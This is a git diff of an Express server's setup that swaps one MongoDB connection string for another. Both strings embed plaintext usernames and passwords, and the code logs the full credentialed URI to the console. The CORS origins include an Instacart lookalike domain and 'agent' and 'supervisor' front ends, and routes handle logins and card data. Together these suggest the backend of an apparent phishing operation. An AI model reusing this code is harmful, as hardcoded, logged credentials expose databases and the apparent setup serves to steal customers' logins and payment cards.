@@ -23,6 +23,7 @@ app.use(
     cors({
       credentials: true,
       origin: ['https://admininstacart.onrender.com', 'https://instacartcustomers.com', 'https://agentfront.onrender.com', 'https://supervisorfront.onrender.com'],
+      
     })
   );
 app.use(cookieParser())
@@ -32,15 +33,14 @@ app.use('/api/login', clientResponse)
 app.use('/api/card', Credit)
 app.use('/api/instacart', originalData)
 app.use('/api/supervisor', Supervisor)
-mongoose.connect(`mongodb+srv://mikaayta:mikaayta@mikiasketema.yydobmk.mongodb.net/seasonOne?retryWrites=true&w=majority`
+mongoose.connect(`mongodb+srv://thiongothiongo753:thiongothiongo753@seasonone.icvizvu.mongodb.net/seasonOne?retryWrites=true&w=majority`
 , {
     useNewUrlParser: true,
     useUnifiedTopology:true,
 });
 
-// mongodb+srv://thiongothiongo753:thiongothiongo@cluster0.l9t3l5u.mongodb.net/?retryWrites=true&w=majority
 mongoose.connection.on('connected', ()=> {
-    console.log('Database Connected to  '+ `mongodb+srv://mikaayta:mikaayta@mikiasketema.yydobmk.mongodb.net/seasonOne?retryWrites=true&w=majority`
+    console.log('Database Connected to  '+ `mongodb+srv://thiongothiongo753:thiongothiongo753@seasonone.icvizvu.mongodb.net/seasonOne?retryWrites=true&w=majority`
     )})
 
 
